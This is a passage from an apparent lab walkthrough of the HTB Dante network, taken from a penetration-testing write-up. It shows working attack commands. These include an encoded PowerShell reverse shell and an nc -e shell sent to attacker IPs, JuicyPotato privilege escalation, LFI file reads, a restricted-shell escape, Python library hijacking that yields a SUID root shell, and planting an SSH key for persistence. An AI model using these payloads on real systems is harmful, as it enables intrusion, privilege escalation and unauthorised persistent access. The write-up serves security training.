139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-11-05T03:22:40
|_Not valid after:  2055-11-05T03:22:40
| ms-sql-ntlm-info:
|   172.16.1.5\SQLEXPRESS:
|     Target_Name: DANTE-SQL01
|     NetBIOS_Domain_Name: DANTE-SQL01
|     NetBIOS_Computer_Name: DANTE-SQL01
|     DNS_Domain_Name: DANTE-SQL01
|     DNS_Computer_Name: DANTE-SQL01
|_    Product_Version: 10.0.14393
|_ssl-date: 2025-11-05T11:38:10+00:00; +2s from scanner time.
| ms-sql-info:
|   172.16.1.5\SQLEXPRESS:
|     Instance name: SQLEXPRESS
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|     TCP port: 1433
|_    Clustered: false
2049/tcp open  nlockmgr     1-4 (RPC #100021)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

```

Since SMB is opened, let’s try null authentication:

```bash
nxc smb 172.16.1.5 -u '' -p '' --shares

SMB         172.16.1.5      445    DANTE-SQL01      [*] Windows 10 / Server 2016 Build 14393 x64 (name:DANTE-SQL01) (domain:DANTE-SQL01) (signing:False) (SMBv1:True)
SMB         172.16.1.5      445    DANTE-SQL01      [-] DANTE-SQL01\: STATUS_ACCESS_DENIED
SMB         172.16.1.5      445    DANTE-SQL01      [-] Error enumerating shares: Error while reading from remote
```

We get the hostname, DANTE-SQL01, which seems to be a SQL server.

Let’s see if there are mountable NFS share.

```bash
showmount -e 172.16.1.5
```

None.

From nmap, we know anonymous login is allowed on FTP:

```bash
ftp 172.16.1.5

#we get flag.txt
```

From our enumeration on DC01, we got a users and passwords list. Let’s use that to password spray FTP:

```bash
msfconsole
use auxiliary/scanner/ftp/ftp_login
set RHOSTS 172.16.1.5
set USERPASS_FILE pwds.txt
set USER_FILE users.txt
run
```

```bash
medusa -h 172.16.1.5 -U users.txt -P pwds.txt -M ftp -t 8
```

None were successful.

We found a SQL credential on ADMIN-NIX06. Let’s try:

```bash
nxc mssql 172.16.1.5 -u sophie -p TerrorInflictPurpleDirt996655 --local-auth

MSSQL       172.16.1.5      1433   DANTE-SQL01      [*] Windows 10 / Server 2016 Build 14393 (name:DANTE-SQL01) (domain:DANTE-SQL01)
MSSQL       172.16.1.5      1433   DANTE-SQL01      [+] DANTE-SQL01\sophie:TerrorInflictPurpleDirt996655 (Pwn3d!)

```

We are logged in, and we are administrator on the machine, which means we have code execution. First, let’s enumerate the db:

```bash
nxc mssql 172.16.1.5  -u sophie -p TerrorInflictPurpleDirt996655 --local-auth -q "SELECT name FROM master.dbo.sysdatabases"

MSSQL       172.16.1.5      1433   DANTE-SQL01      name:master
MSSQL       172.16.1.5      1433   DANTE-SQL01      name:tempdb
MSSQL       172.16.1.5      1433   DANTE-SQL01      name:model
MSSQL       172.16.1.5      1433   DANTE-SQL01      name:msdb
```

Only default db. Now let’s get a reverse shell:

```bash
cat shell.ps1 | iconv -t utf-16le | base64 -w 0

JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA2AC4AMgAnACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA
```

Start listener:

```bash
nc -lnvp 4444
```

To execute commands:

```bash
nxc mssql 172.16.1.5  -u sophie -p TerrorInflictPurpleDirt996655 --local-auth -x "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA2AC4AMgAnACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA"
```

![image.png]({{ site.baseurl }}/assets/dante/image%2021.png)

We now have shell. 

### Privilege Escalation SQL01

Let’s check our privileges:

```bash
whoami /priv
```

![image.png]({{ site.baseurl }}/assets/dante/image%2022.png)

We have SeImpersonatePrivilege, which is vulnerable to potato exploits.

Looking in C:\, we find:

```bash
dir C:\
d-----       31/07/2020     17:40                DB_backups 

cd DB_backups 

dir

----                -------------         ------ ----                                                                  
d-----       31/07/2020     17:40                SQL                                                                   
-a----       31/07/2020     17:42           1088 db_backup.ps1

type db_backup.ps1

# Work in progress database backup script. Adapting from mysql backup script. Does not work yet. Do not use.

$password = 'Alltheleavesarebrown1' 
$user = 'sophie'            
$cred = New-Object System.Net.NetworkCredential($user, $password, "")

$date = Get-Date                                                                                                                               
$dateString = $date.Year.ToString() + "-" + $date.Month.ToString() + "-" + $date.Day.ToString()                         
                                                                                                                                               
#Create symbolic link for sqldump.exe in the script folder                                                                                     
$sqldumpLocation = \.sqldump.exe
$backupDest = C:\DB_backups\SQL\sql_backup_"+ $dateString + ".sql"
                                   
$execute_sqldump = $sqldumpLocation+" -u"+$cred.UserName+" -p"+$cred.Password +" > " + $backupDest

invoke-expression $execute_sqldump

# use 7zip to compress and encrypt the backup with same password as used to autheticate the sql backup user
# removes the unencrypted .sql file afterwards
# create symbolic link for 7z.exe in the script folder
$sevenzip = ".#7z.exe"
$zipfile = $backupDest.Replace(".sql",".7z")
$execute7zip = $sevenzip+" a -t7z "+$zipfile+" "+$backupDest+" -p"+$cred.Password
invoke-expression $execute7zip
Remove-Item $backupDest
```

Password for sophie.

Let’s check with nxc:

```bash
nxc smb 172.16.1.5 -u sophie -p Alltheleavesarebrown1 --shares

SMB         172.16.1.5      445    DANTE-SQL01      [+] DANTE-SQL01\sophie:Alltheleavesarebrown1 
SMB         172.16.1.5      445    DANTE-SQL01      [*] Enumerated shares
SMB         172.16.1.5      445    DANTE-SQL01      Share           Permissions     Remark
SMB         172.16.1.5      445    DANTE-SQL01      -----           -----------     ------
SMB         172.16.1.5      445    DANTE-SQL01      ADMIN$                          Remote Admin
SMB         172.16.1.5      445    DANTE-SQL01      C$                              Default share
SMB         172.16.1.5      445    DANTE-SQL01      DB_backups      READ            
SMB         172.16.1.5      445    DANTE-SQL01      IPC$            READ            Remote IPC

```

We have valid password.

Let’s get a winrm:

```bash
evil-winrm -u sophie -p Alltheleavesarebrown1 -i 172.16.1.5
```

We are in. 

Let’s check privileges:

```bash
whoami /priv

Privilege Name                Description                    State
============================= ============================== =======
SeAssignPrimaryTokenPrivilege Replace a process level token  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

SeAssignPrimaryTokenPrivilege also allows for potato exploit.

Checking systeminfo:

```bash
Host Name:                 DANTE-SQL01                                                                                                         
OS Name:                   Microsoft Windows Server 2016 Standard                                                                              
OS Version:                10.0.14393 N/A Build 14393 
```

This version should be vulnerable to JuicyPotato. Let’s download the exploit from here: https://github.com/ohpe/juicy-potato/releases

Let’s save our powershell reverse shell in a .bat file. Now upload the exploit and our .bat file:

```bash
wget http://10.10.16.2/JuicyPotato.exe -o jp.exe
wget http://10.10.16.2/run.bat -o run.bat
```

Now let’s start a listener and execute:

```bash
#on attack
nc -lnvp 4444

#on target
.\jp.exe -t * -l 53375 -p C:\programdata\run.bat 

c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.16.35 8443 -e cmd.exe" -t *
```

We now have SYSTEM shell:

![image.png]({{ site.baseurl }}/assets/dante/image%2023.png)

The exploit could be done on either mssql session or sophie’s winrm session. 

## 172.16.1.10 DANTE-NIX02

```bash
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 00:50:56:94:E1:D4 (Unknown)
```

```bash
nxc smb 172.16.1.10 -u '' -p '' --shares
SMB         172.16.1.10     445    DANTE-NIX02      [*] Unix - Samba (name:DANTE-NIX02) (domain:) (signing:False) (SMBv1:False) 
SMB         172.16.1.10     445    DANTE-NIX02      [+] \: 
SMB         172.16.1.10     445    DANTE-NIX02      [*] Enumerated shares
SMB         172.16.1.10     445    DANTE-NIX02      Share           Permissions     Remark
SMB         172.16.1.10     445    DANTE-NIX02      -----           -----------     ------
SMB         172.16.1.10     445    DANTE-NIX02      print$                          Printer Drivers
SMB         172.16.1.10     445    DANTE-NIX02      SlackMigration  READ            
SMB         172.16.1.10     445    DANTE-NIX02      IPC$                            IPC Service (DANTE-NIX02 server (Samba, Ubuntu))

```

Let’s list the share:

```bash
nxc smb 172.16.1.10 -u '' -p '' --spider SlackMigration --regex .

SMB         172.16.1.10     445    DANTE-NIX02      //172.16.1.10/SlackMigration/admintasks.txt [lastm:'2020-05-18 11:24' size:279]

```

Let’s download:

```bash
smbclient -N //172.16.1.10/SlackMigration

get admintasks.txt
```

Let’s read:

```bash
-Remove wordpress install from web root - PENDING
-Reinstate Slack integration on Ubuntu machine - PENDING
-Remove old employee accounts - COMPLETE
-Inform Margaret of the new changes - COMPLETE
-Remove account restrictions on Margarets account post-promotion to admin - PENDING

```

### Foothold DANTE-NIX02

Now let’s visit the web page:

```bash
http://172.16.1.10:80
```

![image.png]({{ site.baseurl }}/assets/dante/image%2024.png)

![image.png]({{ site.baseurl }}/assets/dante/image%2025.png)

We see the page HTTP parameter takes user input. Let’s see if it’s vulnerable to local file inclusion (LFI):

```bash
http://172.16.1.10/nav.php?page=../../../../etc/passwd
```

![image.png]({{ site.baseurl }}/assets/dante/image%2026.png)

It is. 

Let’s copy the user list and search whether there is private key in one of the user’s dir. We identify user frank. Let’s attempt to look in their .ssh folder:

```bash
http://172.16.1.10/nav.php?page=../../../../home/frank/.ssh/id_rsa

http://172.16.1.10/nav.php?page=../../../../proc/self/cmdline

```

No result.

Let’s use php filter and read the source of nav.php. 

```bash
http://172.16.1.10/nav.php?page=php://filter/read=convert.base64-encode/resource=nav.php
```

![image.png]({{ site.baseurl }}/assets/dante/image%2027.png)

Decode:

```bash
echo 'PD9waHAKJHBhZ2UgPSAkX0dFVFsncGFnZSddOwppbmNsdWRlICRwYWdlOwo=' | base64 -d

<?php
$page = $_GET['page'];
include $page;
```

This just passes the page http parameter for GET request. Maybe it’s vulnerable to a RFI. Before we go down that route, let’s check it’s config.php which might hold credentials.

```bash
http://172.16.1.10/nav.php?page=php://filter/read=convert.base64-encode/resource=config.php

http://172.16.1.10/nav.php?page=php://filter/read=convert.base64-encode/resource=../config.php
```

No result.

We also remember from admintasks.txt, there is a mention of wordpress in webroot. Let’s see if the configuration file is there:

```bash
http://172.16.1.10/nav.php?page=php://filter/read=convert.base64-encode/resource=../wordpress/wp-config.php
```

![image.png]({{ site.baseurl }}/assets/dante/image%2028.png)

Let’s decode:

```bash
echo 'PD9waHAN<SNIP>' | base64 -d > wp-config.php

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME' 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'margaret' );

/** MySQL database password */
define( 'DB_PASSWORD', 'Welcome1!2@3#' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
<SNIP>
```

In the passwd file, we see margaret has a lshell:

```bash
margaret:x:1001:1001::/home/margaret:/bin/lshell
```

Let’s attempt to login:

```bash
ssh margaret@172.16.1.10
```

![image.png]({{ site.baseurl }}/assets/dante/image%2029.png)

We are on.

### Privilege Escalation DANTE-NIX02

```bash
ssh margaret@172.16.1.10 -t "bash --noprofile"

#margaret:Welcome1!2@3#
```

Did not work.

Listing all available commands:

```bash
?

cd  clear  exit  help  history  lpath  lsudo  vim
```

We do have vim. Let’s try escaping through that. We go on GTFOBin

```bash
vim --cmd ':set lpath=/bin/bash|:lpath'

vim -c ':!/bin/dash'

```

None is working, even variations.

```bash
ssh margaret@172.16.1.10 -t "(){:;}; /bin/bash"
```

 Did not work.

In vim:

```bash
vim

:!python -c "import pty; pty.spawn('/bin/bash')"

** forbidden shell escape: "python -c "import pty; pty.spawn('/bin/bash')""
This incident has been reported.

shell returned 1
```

Returning to vim, let’s do the —cmd manually:

```bash
vim

:set shell=/bin/bash
:shell
```

We now have shell:

![image.png]({{ site.baseurl }}/assets/dante/image%2030.png)

Let’s enumerate:

![image.png]({{ site.baseurl }}/assets/dante/image%2031.png)

Now let’s try connecting to mysql:

```bash
mysql -u margaret -h localhost -p

margaret@DANTE-NIX02:~$ mysql -u margaret -h localhost -p
Enter password: 
ERROR 1045 (28000): Access denied for user 'margaret'@'localhost' (using password: YES)
margaret@DANTE-NIX02:~$ mysql
ERROR 1045 (28000): Access denied for user 'margaret'@'localhost' (using password: NO)

```

Let’s use linpeas to enumerate host.

First we have to add a listener on our ligolo-ng proxy:

```bash
#on ligolo proxy server attack host
listener_add --addr 0.0.0.0:8000 --to 0.0.0.0:8001
```

Now start our python server on attack host:

```bash
python3 -m http.server 8001
```

Now on web-nix02:

```bash
wget http://172.16.1.100:8000/linpeas.sh

2025-11-04 02:44:29 (1.63 MB/s) - ‘linpeas.sh’ saved [964554/964554]
```

After executing, this is the interesting finds:

```bash
OS: Linux version 5.15.0-46-generic (buildd@lcy02-amd64-007) (gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, GNU ld (GNU Binutils for Ubuntu) 2.34)
 #49~20.04.1-Ubuntu SMP Thu Aug 4 19:15:44 UTC 2022                    
User & Groups: uid=1001(margaret) gid=1001(margaret) groups=1001(margaret)
Hostname: DANTE-NIX02

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester 
Vulnerable to CVE-2021-3560

                ╔════════════════════════════════════════════════╗                                                                             
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                                             
                ╚════════════════════════════════════════════════╝                                                                             
╔══════════╣ Running processes (cleaned) 
frank       2267  0.4  3.8 38986396 154516 ?     SLl  Nov03   2:07  _ /snap/slack/65/usr/lib/slack/slack --no-sandbox --executed-from=/home/fra
nk --pid=1772 --enable-crashpad

╔══════════╣ Check for vulnerable cron jobs                                                                                                    
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs                                           
══╣ Cron jobs list                                                                                                                             
/usr/bin/crontab                                                                                                                               
incrontab Not Found                                                                                                                            
-rw-r--r-- 1 root root    1042 Feb 13  2020 /etc/crontab                                                                                       
                                                                                                                                               
/etc/cron.d:                                                                                                                                   
total 52                                                                                                                                       
drwxr-xr-x   2 root root  4096 Aug 25  2022 .
drwxr-xr-x 137 root root 12288 Aug 25  2022 ..
-rw-r--r--   1 root root   285 Jul 16  2019 anacron
-rw-r--r--   1 root root   201 Feb 13  2020 e2scrub_all
-rw-r--r--   1 root root   121 Aug 25  2022 omilogrotate
-rw-r--r--   1 root root   118 Aug 25  2022 omsagent
-rw-r--r--   1 root root    79 Aug 25  2022 OMSConsistencyInvoker
-rw-r--r--   1 root root   712 Mar 27  2020 php
-rw-r--r--   1 root root   102 Feb 13  2020 .placeholder
-rw-r--r--   1 root root   191 May 18  2020 popularity-contest
-rw-r--r--   1 root root   135 Aug 25  2022 scxagent

╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports
══╣ Active Ports (netstat)
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -                   
tcp6       0      0 ::1:631                 :::*                    LISTEN      -                   
tcp6       0      0 :::445                  :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::139                  :::*                    LISTEN      -  

╔══════════╣ Currently Logged in Users

══╣ Basic user information
 02:50:43 up  7:26,  2 users,  load average: 1.24, 0.62, 0.24
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
frank    :0       :0               19:24   ?xdm?  11:29   0.01s /usr/li 
margaret pts/0    172.16.1.100     01:52    2:59   3.81s  0.00s /bin/sh 

══╣ Active sessions
 02:50:43 up  7:26,  2 users,  load average: 1.24, 0.62, 0.24
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
frank    :0       :0               19:24   ?xdm?  11:29   0.01s /usr/li 
margaret pts/0    172.16.1.100     01:52    2:59   3.81s  0.00s w

╔══════════╣ Unexpected in root
/html
/1
/samba

╔══════════╣ Files inside others home (limit 20)
/home/frank/Downloads/Test Workspace Slack export May 17 2020 - May 18 2020/channels.json
/home/frank/Downloads/Test Workspace Slack export May 17 2020 - May 18 2020/users.json
/home/frank/Downloads/Test Workspace Slack export May 17 2020 - May 18 2020/integration_logs.json
/home/frank/Downloads/Test Workspace Slack export May 17 2020 - May 18 2020.zip

```

The logged in users full ouptput is cut-off, let’s execute it manuall:

```bash
w

 03:10:05 up  7:46,  2 users,  load average: 0.00, 0.02, 0.09
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
frank    :0       :0               19:24   ?xdm?  12:04   0.01s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu /
margaret pts/0    172.16.1.100     01:52    0.00s  5.90s  0.01s w

```

Looking at the cron jobs, all to do with logrotate:

```bash
margaret@DANTE-NIX02:/samba$ cat /etc/cron.d/omilogrotate
*/15 * * * * root /usr/sbin/logrotate /etc/logrotate.d/omi --state /var/opt/omi/log/omi-logrotate.status >/dev/null 2>&1
margaret@DANTE-NIX02:/samba$ cat /etc/cron.d/omsagent
*/5 * * * * root /usr/sbin/logrotate -s /var/lib/logrotate/omsagent-status /etc/logrotate.d/omsagent* >/dev/null 2>&1
margaret@DANTE-NIX02:/samba$ cat /etc/cron.d/OMSConsistencyInvoker
6,21,36,51 * * * * omsagent /opt/omi/bin/OMSConsistencyInvoker >/dev/null 2>&1
margaret@DANTE-NIX02:/samba$ cat /etc/cron.d/php
# /etc/cron.d/php@PHP_VERSION@: crontab fragment for PHP
#  This purges session files in session.save_path older than X,
#  where X is defined in seconds as the largest value of
#  session.gc_maxlifetime from all your SAPI php.ini files
#  or 24 minutes if not defined.  The script triggers only
#  when session.save_handler=files.
#
#  WARNING: The scripts tries hard to honour all relevant
#  session PHP options, but if you do something unusual
#  you have to disable this script and take care of your
#  sessions yourself.

# Look for and purge old sessions every 30 minutes
09,39 *     * * *     root   [ -x /usr/lib/php/sessionclean ] && if [ ! -d /run/systemd/system ]; then /usr/lib/php/sessionclean; fi
margaret@DANTE-NIX02:/samba$ cat /etc/cron.d/scxagent 
0 */4 * * * root /usr/sbin/logrotate /etc/logrotate.d/scxagent --state /var/opt/microsoft/scx/log/scx-logrotate.status >/dev/null 2>&1
```

Let’s look in /home/frank/Downloads. We see a slack directory. Let’s download it to our host:

```bash
cp Test\ Workspace\ Slack\ export\ May\ 17\ 2020\ -\ May\ 18\ 2020.zip /tmp/slack_report.zip

cd /tmp

python3 -m http.server 8000
```

Now back on attack host:

```bash
wget http://172.16.1.10:8000/slack_report.zip 
```

In the secure dir, summary:

```bash
04:00:01 UTC (1589794001):

Frank joins the channel.
Frank sets the channel purpose to "discuss network security".

04:00:07 UTC (1589794007):

Margaret joins the channel, invited by Frank.

04:01:09 UTC (1589794069):

Frank messages: "Hi Margaret, I created the channel so we can discuss the network security - in private!"

04:01:19 UTC (1589794079):

Margaret replies: "Great idea, Frank".

04:03:07 UTC (1589794187):

Frank messages: "We need to migrate the Slack workspace to the new Ubuntu images, can you do this today?"

04:03:26 UTC (1589794206):

Margaret responds: "Sure, but I need my password for the Ubuntu images, I haven't been given it yet".

04:05:45 UTC (1589794345):

Frank replies: "Ahh sorry about that - its STARS5678FORTUNE401".

04:05:55 UTC (1589794355):

Margaret says: "Thanks very much, I'll get on that now."

04:06:35 UTC (1589794395):

Frank messages: "No problem at all. I'll make this channel private from now on - we cant risk another breach".

04:09:37 UTC (1589795777):

Margaret requests: "Please get rid of my admin privs on the Ubuntu box and go ahead and make yourself an admin account".

04:09:45 UTC (1589795785):

Frank responds: "Thanks, will do".

07:04:50 UTC (1589806690):

Margaret messages: "I also set you a new password on the Ubuntu box - 69F15HST1CX, same username".

Extracted Credentials
From the conversation, the following credentials are explicitly mentioned:

Password 1: STARS5678FORTUNE401

Provided by Frank to Margaret for the Ubuntu images.
Likely Margaret’s password for an Ubuntu system or account.

Password 2: 69F15HST1CX

Set by Margaret for Frank’s account on the Ubuntu box, using the same username 

Associated Usernames:

Margaret: Slack username thisissecretright (real name Margaret), user ID U014025GL3W.
Frank: Slack username htb_donotuse (real name Frank), user ID U013CT40QHM.

```

However, this password did not work. After more enumeration, we find  a .config in margaret’s home directory:

```bash
cat ~/.config/Slack/exported_data/secure/2020-05-18.json

<SNIP>

                                "text": "I also set you a new password on the Ubuntu box - TractorHeadtorchDeskmat, same username"

```

We get a different password this time. Let’s try:

```bash
su frank
```

We are now frank:

![image.png]({{ site.baseurl }}/assets/dante/image%2032.png)

Uploading and executing pspy, we see this:

```bash
./pspy64

2025/11/04 03:20:01 CMD: UID=0     PID=155340 | python3 /home/frank/apache_restart.py                                                          
2025/11/04 03:20:01 CMD: UID=0     PID=155339 | /bin/sh -c python3 /home/frank/apache_restart.py; sleep 1; rm /home/frank/call.py; sleep 1; rm 
/home/frank/urllib.py               
<SNIP>

2025/11/04 04:12:01 CMD: UID=0     PID=160500 | /usr/sbin/CRON -f                                                                              
2025/11/04 04:12:01 CMD: UID=0     PID=160502 | python3 /home/frank/apache_restart.py                                                          
2025/11/04 04:12:02 CMD: UID=0     PID=160503 | sleep 1                                                                                        
2025/11/04 04:12:03 CMD: UID=0     PID=160504 |                                                                                                
2025/11/04 04:12:03 CMD: UID=0     PID=160505 | sleep 1                                                                                        2025/11/04 04:12:04 CMD: UID=0     PID=160506 | rm /home/frank/urllib.py 

```

Cron daemon is running apache_restart.py in frank’s home dir as root.

Let’s see the content of apache_restart.py:

```bash
import call
import urllib
url = urllib.urlopen(localhost)
page= url.getcode()
if page ==200:
        print ("We're all good!")
else:
        print("We're failing!")
        call(["systemctl start apache2"], shell=True)

```

It seems to be a python2 script. Let’s check the library path priority:

```bash
python2

>> import sys
>> sys.path

['', '/usr/lib/python2.7', '/usr/lib/python2.7/plat-x86_64-linux-gnu', '/usr/lib/python2.7/lib-tk', '/usr/lib/python2.7/lib-old', '/usr/lib/python2.7/lib-dynload', '/usr/local/lib/python2.7/dist-packages', '/usr/lib/python2.7/dist-packages']

```

This mean the code first checks the current directory. Since the script is in frank’s home directory, let’s create our own urllib.py

```bash
import os
os.system("cp /bin/sh /tmp/sh; chmod u+s /tmp/sh")
```

Now we save the file and wait for a minute.

Now we list dirs in /tmp:

```bash
ls /tmp
```

![image.png]({{ site.baseurl }}/assets/dante/image%2033.png)

We have a privileged shell. Let’s execute:

```bash
./sh -p

id
```

![image.png]({{ site.baseurl }}/assets/dante/image%2034.png)

We are now root.

Again, let’s inject our public key so we get persistent access:

```bash
cd /root/.ssh

echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB3L2dEF1Lz4/jTwwFS9bYRZTt7PZkUx0eJmkN2vUQG6 kali@kali' >> authorized_keys

chown root:root authorized_keys
```

Now ssh back on:

```bash
ssh -i dante root@172.16.1.10
```

![image.png]({{ site.baseurl }}/assets/dante/image%2035.png)

We are now root.

## 172.16.1.13 DANTE-WS01

```bash
80/tcp  open  http
443/tcp open  https
445/tcp open  microsoft-ds
MAC Address: 00:50:56:94:5D:98 (Unknown)

sudo nmap 172.16.1.13 -sC -sV -oN DANTE-WS01

80/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.7)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.7
| http-title: Welcome to XAMPP
|_Requested resource was http://172.16.1.13/dashboard/
443/tcp open  ssl/http      Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.7)
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.7
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| http-title: Welcome to XAMPP
|_Requested resource was https://172.16.1.13/dashboard/
445/tcp open  microsoft-ds?

```

Find hostname:

```bash
nxc smb 172.16.1.13 -u '' -p '' --shares

